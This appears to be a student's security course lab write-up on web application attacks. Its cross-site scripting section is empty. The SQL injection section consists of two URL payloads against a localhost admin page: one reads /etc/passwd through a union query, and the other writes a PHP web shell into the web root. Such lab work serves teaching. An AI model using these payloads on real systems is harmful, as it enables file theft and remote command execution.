# Language-based Security

## Lab 3 - Web Application Security

### Part 1: Cross-Site Scripting (XSS)



### Part 2: SQL Injection

http://localhost/admin/edit.php?id=0%20union%20select%201,2,load_file("/etc/passwd"),4

http://localhost/admin/edit.php?id=0%20union%20select%201,2,%22%3C?php%20system($_GET[%27cmd%27]);%20?%3E%22,4%20into%20outfile%20%22/var/www/css/webshell.php%22